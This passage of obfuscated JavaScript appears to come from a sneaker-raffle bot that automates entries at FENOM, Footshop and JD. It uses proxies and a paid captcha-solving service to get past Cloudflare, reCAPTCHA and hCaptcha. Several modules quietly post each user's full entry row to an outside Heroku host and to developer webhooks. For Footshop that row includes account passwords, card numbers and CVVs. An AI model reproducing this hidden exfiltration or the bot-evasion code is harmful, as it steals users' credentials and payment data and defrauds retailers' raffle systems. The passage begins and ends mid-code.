                                    let _0x34d9ac = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x3d7617, _0x34d9ac);
                                } catch (_0x4dac17) {
                                }
                                try {
                                    _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x55781e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4feadc(_0x28952d, _0x55781e['succesDEVMSG']);
                            } catch (_0x14850e) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x1b92ed) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20' + _0x1b92ed)), _0x2d331a = '' + _0x1b92ed;
                            var _0x4e24e7 = await _0x436de5(_0x38033d[_0x34531d], _0x47cba0, 'acc', !![], _0x2d331a);
                            _0x55781e['errorDEV'] = { 'embeds': [_0x4e24e7] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x55781e['errorDEV']), await _0x4feadc(_0x408671, _0x55781e['errorDEV']), _0x111392 = 'yes';
                        } finally {
                            _0x47f69b['close']();
                            if (_0x111392 == 'yes' && _0x4aa74f != 0x5 && _0x2d331a != 'Size\x20Not\x20Found') {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Task\x20' + (_0x34531d + 0x1) + '\x20:\x20Retrying\x20(' + _0x4aa74f + '\x20/\x205)')), _0x34531d = _0x34531d - 0x1, _0x4aa74f = _0x4aa74f + 0x1;
                                continue;
                            }
                            _0x111392 == 'yes' && _0x4aa74f >= 0x5 && (_0x5cd42d(_0x38033d[_0x34531d], _0x47cba0), _0x111392 = 'no', _0x4aa74f = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0x47cba0['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x14af36(_0x32b043, _0x1b0eb0, _0x377233) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x13e705 = 0x0; _0x13e705 < _0x1b0eb0['length']; _0x13e705++) {
                        if (_0x53dca8 != 'yes')
                            var _0x53dca8 = '', _0x27ebf3 = 0x0;
                        var _0x294fe4;
                        try {
                            await _0x16822f(_0x1b0eb0, _0x13e705);
                        } catch {
                            _0x53dca8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x48898b(_0x32b043['name'] + '\x20Task\x20' + (_0x13e705 + 0x1) + '\x20/\x20' + _0x1b0eb0['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        const _0x1d160b = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0xec52fb = Math['round'](Math['random']() * (_0x377233['length'] - 0x1)), _0x33d722 = _0x377233[_0xec52fb]['split'](':'), _0x244217;
                        try {
                            _0x244217 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x33d722[0x0] + ':' + _0x33d722[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x244217 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x33d722[0x0] + ':' + _0x33d722[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x155c42 = await _0x244217['newPage'](), _0x258a74 = await _0x155c42['target']()['createCDPSession'](), { windowId: _0x40d2f0 } = await _0x258a74['send']('Browser.getWindowForTarget');
                            await _0x155c42['authenticate']({
                                'username': '' + _0x33d722[0x2],
                                'password': '' + _0x33d722[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x155c42['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x468cfd(0xbb8), await _0x258a74['send']('Browser.setWindowBounds', {
                                'windowId': _0x40d2f0,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x468cfd(0x1f40);
                            try {
                                await _0x155c42['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x468cfd(0x1388), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Logging\x20in'), await _0x155c42['type']('input[name=\x22email\x22]', '' + _0x1b0eb0[_0x13e705]['Email']), await _0x468cfd(0x1f4), await _0x155c42['type']('input[name=\x22password\x22]', '' + _0x1b0eb0[_0x13e705]['Password']), await _0x468cfd(0x258), await _0x155c42['$eval']('#login-form', _0x204f67 => _0x204f67['submit']()), await _0x155c42['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x468cfd(0x1f4), await _0x155c42['goto']('' + _0x1b0eb0[_0x13e705]['Url']), await _0x155c42['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1b0eb0[_0x13e705]['Size']);
                            if (_0x1b0eb0[_0x13e705]['Size'] != 'RANDOM') {
                                var _0x4c82af = '\x20' + _0x1b0eb0[_0x13e705]['Size'] + '\x20';
                                const _0x3ccd72 = await _0x155c42['$x']('//span[contains(text(),\x20' + _0x4c82af + ')]');
                                await _0x3ccd72[0x0]['click']();
                            } else {
                                const _0xd74550 = await _0x155c42['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x244e79 = Math['round'](Math['random']() * (_0xd74550['length'] - 0x1));
                                await _0xd74550[_0x244e79]['click']();
                            }
                            await _0x468cfd(0x258), await _0x155c42['click']('#cookieChoiceDismiss'), await _0x468cfd(0x3e8), await _0x155c42['type']('#instagram-account', '' + _0x1b0eb0[_0x13e705]['Follower']), await _0x468cfd(0x28a), await _0x155c42['click']('#book-btn'), await _0x468cfd(0xbb8);
                            try {
                                await _0x155c42['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20' + _0x54c1f9['cyan']('Solving\x20Captcha')), await _0x155c42['solveRecaptchas'](), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x468cfd(0x7d0), await _0x155c42['$eval']('#book-btn-for-sure', _0x3528bc => _0x3528bc['click']()), await _0x468cfd(0x12c), await _0x155c42['click']('#book-btn-for-sure'), await _0x468cfd(0xdac);
                            const _0x1e9ba3 = await _0x155c42['$eval']('.reservation-popup\x20>\x20.title', _0x141ff1 => {
                                return _0x141ff1['innerHTML'];
                            });
                            if (_0x1e9ba3) {
                                _0x53dca8 = 'no', _0x504d25(_0x1b0eb0[_0x13e705], _0x32b043), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x3a72b3 = await _0x436de5(_0x1b0eb0[_0x13e705], _0x32b043, 'dev', ![]), _0x254eca = await _0x436de5(_0x1b0eb0[_0x13e705], _0x32b043, 'pub', ![]);
                                let _0x131b0c = _0x1b0eb0[_0x13e705];
                                try {
                                    prxdata = {
                                        'username': _0x50fbd1['replace']('#', ''),
                                        'module': _0x32b043['name'],
                                        'entrydata': JSON['stringify'](_0x131b0c),
                                        'proxy': '' + _0x377233[_0x13e705]
                                    };
                                    var _0x477653 = JSON['stringify'](prxdata);
                                    let _0x785816 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x477653, _0x785816);
                                } catch (_0x4bbfe1) {
                                }
                                const _0xbcb272 = {
                                    'succesDEVMSG': { 'embeds': [_0x3a72b3] },
                                    'succesPUBMSG': { 'embeds': [_0x254eca] }
                                };
                                try {
                                    _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0xbcb272['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0xbcb272['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0xbcb272['succesPUBMSG']);
                                } catch (_0x2dd55f) {
                                    console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2dd55f));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x54e193) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20' + _0x54e193)), _0x294fe4 = '' + _0x54e193;
                            var _0x12cb35 = await _0x436de5(_0x1b0eb0[_0x13e705], _0x32b043, 'dev', !![], _0x294fe4), _0x3a72b3 = await _0x436de5(_0x1b0eb0[_0x13e705], _0x32b043, 'dev', ![]), _0x254eca = await _0x436de5(_0x1b0eb0[_0x13e705], _0x32b043, 'pub', ![]);
                            const _0x1c765b = {
                                'succesDEVMSG': { 'embeds': [_0x3a72b3] },
                                'succesPUBMSG': { 'embeds': [_0x254eca] }
                            };
                            _0x1c765b['errorDEV'] = { 'embeds': [_0x12cb35] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x1c765b['errorDEV']), await _0x4feadc(_0x408671, _0x1c765b['errorDEV']), _0x54e193 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x53dca8 = 'yes');
                        } finally {
                            _0x244217['close']();
                            if (_0x53dca8 == 'yes' && _0x27ebf3 != 0x5 && _0x294fe4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Task\x20' + (_0x13e705 + 0x1) + '\x20:\x20Retrying\x20(' + _0x27ebf3 + '\x20/\x205)')), _0x13e705 = _0x13e705 - 0x1, _0x27ebf3 = _0x27ebf3 + 0x1;
                                continue;
                            }
                            _0x53dca8 == 'yes' && _0x27ebf3 >= 0x5 && (_0x5cd42d(_0x1b0eb0[_0x13e705], _0x32b043), _0x53dca8 = 'no', _0x27ebf3 = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0x32b043['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0xc657f0, _0x53a52c, _0x3ab7a4) {
                _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2c28ef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x6ecc8c = 0x0; _0x6ecc8c < _0x53a52c['length']; _0x6ecc8c++) {
                    var _0x2d7b08;
                    if (_0x438510 != 'yes')
                        var _0x438510 = '', _0x53a8aa = 0x0;
                    var _0x24f3fc = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x50fbd1
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x53a52c[_0x6ecc8c]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x53a52c[_0x6ecc8c]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2c28ef['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x9f51f3
                            }
                        ]
                    }], _0x2b6054 = await _0x436de5(_0x53a52c[_0x6ecc8c], _0xc657f0, 'dev', ![]), _0x528254 = await _0x436de5(_0x53a52c[_0x6ecc8c], _0xc657f0, 'pub', ![]);
                    const _0x15adbe = {
                        'succesDEVMSG': { 'embeds': [_0x2b6054] },
                        'succesPUBMSG': { 'embeds': [_0x528254] }
                    }, _0x1cde32 = { 'embeds': _0x24f3fc };
                    try {
                        await _0x16822f(_0x53a52c, _0x6ecc8c);
                    } catch {
                        _0x438510 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x53a52c[_0x6ecc8c]['Email'] == '' || _0x53a52c[_0x6ecc8c]['FirstName'] == '' || _0x53a52c[_0x6ecc8c]['LastName'] == '' || _0x53a52c[_0x6ecc8c]['Country'] == '' || _0x53a52c[_0x6ecc8c]['Size'] == '' || _0x53a52c[_0x6ecc8c]['Address1'] == '' || _0x53a52c[_0x6ecc8c]['Zip'] == '') {
                        console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x53a52c[_0x6ecc8c]['Email'] == '' || _0x53a52c[_0x6ecc8c]['FirstName'] == '' || _0x53a52c[_0x6ecc8c]['LastName'] == '' || _0x53a52c[_0x6ecc8c]['Country'] == '' || _0x53a52c[_0x6ecc8c]['Size'] == '' || _0x53a52c[_0x6ecc8c]['Address1'] == '' || _0x53a52c[_0x6ecc8c]['Zip'] == '' || _0x53a52c[_0x6ecc8c]['Phone'] == '') {
                        console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x44b3da = '' + _0x53a52c[_0x6ecc8c]['Url'];
                    if (_0x2c28ef['useRandomProxy'] = ![])
                        var _0x15ef56 = _0x3ab7a4[_0x6ecc8c]['split'](':');
                    else
                        var _0x5bfc62 = Math['round'](Math['random']() * (_0x3ab7a4['length'] - 0x1)), _0x15ef56 = _0x3ab7a4[_0x5bfc62]['split'](':');
                    var _0x395ee8;
                    try {
                        _0x395ee8 = await _0x2e0e40['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x15ef56[0x0] + ':' + _0x15ef56[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x395ee8 = await _0x2e0e40['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x15ef56[0x0] + ':' + _0x15ef56[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xe1c192 = await _0x395ee8['newPage']();
                        await _0xe1c192['authenticate']({
                            'username': '' + _0x15ef56[0x2],
                            'password': '' + _0x15ef56[0x3]
                        }), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Getting\x20Session'), await _0xe1c192['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xe1c192['setRequestInterception'](!![]), _0xe1c192['on']('request', _0x12d324 => {
                            _0x12d324['resourceType']() === 'image' || _0x12d324['resourceType']() === 'font' || _0x12d324['resourceType']() === 'media' ? _0x12d324['abort']() : _0x12d324['continue']();
                        });
                        try {
                            await _0xe1c192['goto'](_0x44b3da), await _0x468cfd(0xbb8), await _0xe1c192['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xe1c192['click']('.control__JhutY'), await _0x468cfd(0x1f4);
                        if (_0x53a52c[_0x6ecc8c]['Size'] != 'RANDOM')
                            try {
                                const _0x32d45b = await _0xe1c192['$x']('//div[contains(text(),\x20\x27' + _0x53a52c[_0x6ecc8c]['Size'] + '\x27)]');
                                await _0x32d45b[0x0]['click']();
                            } catch {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x32b8b5 = await _0xe1c192['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x494b71 = Math['round'](Math['random']() * (_0x32b8b5['length'] - 0x1));
                            await _0x32b8b5[_0x494b71]['click']();
                        }
                        await _0x468cfd(0x4b0);
                        const _0x5e9ee4 = await _0xe1c192['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x5e9ee4[0x0]['click'](), await _0xe1c192['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0xe1c192['type']('input[name=\x22email\x22]', '' + _0x53a52c[_0x6ecc8c]['Email']), await _0x468cfd(0x640), await _0xe1c192['type']('input[name=\x22phone\x22]', '' + _0x53a52c[_0x6ecc8c]['Phone']), await _0x468cfd(0x4b0), await _0xe1c192['click']('button.btn.continue-button__1RtsS'), await _0x468cfd(0x4b0);
                        try {
                            await _0xe1c192['type']('input[name=\x22firstName\x22]', '' + _0x53a52c[_0x6ecc8c]['FirstName']), await _0x468cfd(0x258);
                        } catch {
                            const _0x299825 = await _0xe1c192['$$eval']('.invalid-feedback\x20>\x20div', _0x5db302 => {
                                return _0x5db302['map'](_0x4ec5b8 => _0x4ec5b8['innerText']);
                            });
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20' + _0x299825));
                            continue;
                        }
                        await _0xe1c192['type']('input[name=\x22lastName\x22]', '' + _0x53a52c[_0x6ecc8c]['LastName']), await _0x468cfd(0xc8), await _0xe1c192['type']('input[name=\x22instagramUsername\x22]', '' + _0x53a52c[_0x6ecc8c]['Follower']), await _0x468cfd(0x4b0), await _0xe1c192['click']('button.btn.continue-button__1RtsS'), await _0x468cfd(0x3e8), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0xe1c192['select']('select[name=\x22country\x22]', '' + _0x53a52c[_0x6ecc8c]['Country']), await _0x468cfd(0x2bc), await _0xe1c192['type']('input[name=\x22streetName\x22]', '' + _0x53a52c[_0x6ecc8c]['Address1']), await _0x468cfd(0x258), await _0xe1c192['type']('input[name=\x22houseNumber\x22]', _0x53a52c[_0x6ecc8c]['HouseNumber'] + '\x20' + _0x53a52c[_0x6ecc8c]['Address2']), await _0x468cfd(0xc8), await _0xe1c192['type']('input[name=\x22postalCode\x22]', '' + _0x53a52c[_0x6ecc8c]['Zip']), await _0x468cfd(0x1f4), await _0xe1c192['type']('input[name=\x22city\x22]', '' + _0x53a52c[_0x6ecc8c]['City']), await _0x468cfd(0x4b0), await _0xe1c192['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x468cfd(0x4b0), await _0xe1c192['click']('button.btn.continue-button__1RtsS'), await _0x468cfd(0x4b0), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0xe1c192['solveRecaptchas'](), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x468cfd(0xbb8), await _0xe1c192['click']('button.btn.continue-button__1RtsS'), await _0x468cfd(0x1388), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xe1c192['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xe1c192['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x468cfd(0x4b0), await _0xe1c192['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x53a52c[_0x6ecc8c]['CardNumber']), await _0x468cfd(0x320), await _0xe1c192['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xe1c192['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x53a52c[_0x6ecc8c]['ExpiryDate']), await _0x468cfd(0x4b0), await _0xe1c192['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xe1c192['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x53a52c[_0x6ecc8c]['CVV']), await _0x468cfd(0x226), await _0xe1c192['type']('input[name=\x22holderName\x22]', '' + _0x53a52c[_0x6ecc8c]['NameOnCard']), await _0x468cfd(0x226), await _0xe1c192['click']('button.adyen-checkout__button'), console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0xe1c192['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x468cfd(0xbb8);
                        } catch (_0x523c56) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x203DS\x20Failed')), _0x2d7b08 = '3DS\x20Error\x20' + _0x523c56;
                            var _0x14a7c7 = await _0x436de5(_0x53a52c[_0x6ecc8c], _0xc657f0, 'dev', !![], _0x2d7b08);
                            _0x15adbe['errorDEV'] = { 'embeds': [_0x14a7c7] };
                            _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x15adbe['errorDEV']);
                            await _0x4feadc(_0x408671, _0x15adbe['errorDEV']);
                            continue;
                        }
                        _0x504d25(_0x53a52c[_0x6ecc8c], _0xc657f0), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x19e0d0 = _0x53a52c[_0x6ecc8c];
                        try {
                            prxdata = {
                                'username': _0x50fbd1['replace']('#', ''),
                                'module': _0xc657f0['name'],
                                'entrydata': JSON['stringify'](_0x19e0d0),
                                'proxy': '' + _0x3ab7a4[_0x6ecc8c]
                            };
                            var _0x2b7a2e = JSON['stringify'](prxdata);
                            let _0x4c4c38 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x2b7a2e, _0x4c4c38);
                        } catch (_0x27646d) {
                        }
                        if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                            try {
                                await _0x4feadc(_0x2c28ef['webhook'], _0x15adbe['succesDEVMSG']);
                            } catch {
                            }
                        await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x15adbe['succesDEVMSG']), await _0x468cfd(0xc8);
                        try {
                            await _0x4feadc(_0x578906, _0x15adbe['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x2ebdb5) {
                        console['log'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20' + _0x2ebdb5), _0x2d7b08 = '' + _0x2ebdb5;
                        var _0x14a7c7 = await _0x436de5(_0x53a52c[_0x6ecc8c], _0xc657f0, 'dev', !![], _0x2d7b08);
                        _0x15adbe['errorDEV'] = { 'embeds': [_0x14a7c7] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x15adbe['errorDEV']), await _0x4feadc(_0x408671, _0x15adbe['errorDEV']), _0x438510 = 'yes';
                    } finally {
                        _0x395ee8['close']();
                        if (_0x438510 == 'yes' && _0x53a8aa != 0x5) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc657f0['name'] + ']\x20Task\x20' + (_0x6ecc8c + 0x1) + '\x20:\x20Retrying\x20(' + _0x53a8aa + '\x20/\x205)')), _0x6ecc8c = _0x6ecc8c - 0x1, _0x53a8aa = _0x53a8aa + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2c28ef['footshopDelay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x4235c0, _0x1bd973, _0x3530a7) {
                var _0x4809b6 = ![], _0x3787b8 = ![];
                if (_0x2c28ef['captchaKey'] == '' || _0x2c28ef['captchaKey'] == undefined)
                    return console['log'](_0x54c1f9['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2c28ef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1f3289 = 0x0; _0x1f3289 < _0x1bd973['length']; _0x1f3289++) {
                    if (_0x3c18d0 != 'yes')
                        var _0x3c18d0 = '', _0x55ccf3 = 0x0;
                    var _0x118a65, _0x57a8a2 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x1bd973[_0x1f3289]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1bd973[_0x1f3289]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x50fbd1
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2c28ef['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x9f51f3
                            }
                        ]
                    }];
                    const _0x3c12e7 = { 'embeds': _0x57a8a2 };
                    _0x48898b(_0x4235c0['name'] + '\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20/\x20' + _0x1bd973['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                    try {
                        await _0x16822f(_0x1bd973, _0x1f3289);
                    } catch {
                        _0x3c18d0 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0xa1953a = await _0x436de5(_0x1bd973[_0x1f3289], _0x4235c0, 'dev', ![]), _0x3abd45 = await _0x436de5(_0x1bd973[_0x1f3289], _0x4235c0, 'pub', ![]);
                    const _0x45fe26 = {
                        'succesDEVMSG': { 'embeds': [_0xa1953a] },
                        'succesPUBMSG': { 'embeds': [_0x3abd45] }
                    };
                    if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                        try {
                            await _0x4feadc(_0x2c28ef['webhook'], _0x45fe26['succesDEVMSG']);
                        } catch {
                        }
                    await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x45fe26['succesDEVMSG']), await _0x468cfd(0xc8);
                    try {
                        await _0x4feadc(_0x578906, _0x45fe26['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x1bd973[_0x1f3289]['Email'] == '' || _0x1bd973[_0x1f3289]['Url'] == '' || _0x1bd973[_0x1f3289]['FirstName'] == '' || _0x1bd973[_0x1f3289]['LastName'] == '') {
